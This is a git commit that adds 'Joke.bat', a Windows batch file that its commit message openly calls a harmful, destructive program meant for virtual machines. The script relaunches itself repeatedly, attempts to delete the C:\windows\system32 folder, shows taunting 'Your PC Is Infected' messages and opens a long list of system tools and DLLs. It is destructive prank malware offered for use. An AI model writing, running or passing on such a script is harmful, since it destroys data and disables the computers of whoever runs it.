ab5049961b399dfbf72273404d545e0cf00c06d6
Lisandro 07 Files And Windows <97541842+Lisandro07e@users.noreply.github.com>
2024-01-06 23:28:29 -0300

    Joke.bat
    Be careful with this harmful file Because it runs on all versions of Windows Only run the program on a Virtual Machine Not on a Real Machine Because the Creator of the Program is not responsible for the damage to your Physical PC Thank you You have been warned enjoy the destruction Thank you :D
    Some files do not run well, for example Windows XP, Vista, Lonhorn Etc. Only Older Versions Are Not Well Adapted to the Dangerous File

---
+++ Joke.bat
@@ -0,0 +1,26 @@
+start joke.bat
+@echo off
+del C:\\windows\system32
+msg * Your PC Is Infected and also your system is deleted good lock fixing now your system
+msg * its creator is not responsible for the execution of the file
+msg * Bye
+start cmd
+start wusa.exe
+start imageres.dll
+start notepad.exe
+start winver.exe
+start conhost.exe
+start iexplore.exe
+start wmplayer.exe
+start mmc.exe
+start services.msc
+start services.exe
+start shell32.dll
+start taskmgr.exe
+start regedit.exe
+start control
+start gpedit.exe
+start aadjcsp.dll
+start acmigration.dll
+start taskschd.msc
+start taskschd.dll
